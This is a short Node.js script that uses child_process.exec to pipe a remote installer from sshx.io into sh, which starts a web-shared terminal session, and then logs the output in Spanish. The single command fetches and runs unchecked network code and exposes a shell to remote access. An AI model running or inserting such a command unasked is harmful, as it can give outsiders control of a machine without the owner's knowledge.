const { exec } = require('child_process');

exec('curl -sSf https://sshx.io/get | sh -s run', (error, stdout, stderr) => {
    if (error) {
        console.error(`Error al ejecutar el comando: ${error.message}`);
        return;
    }

    if (stderr) {
        console.error(`Error en la salida: ${stderr}`);
        return;
    }

    console.log(`Resultado: ${stdout}`);
});
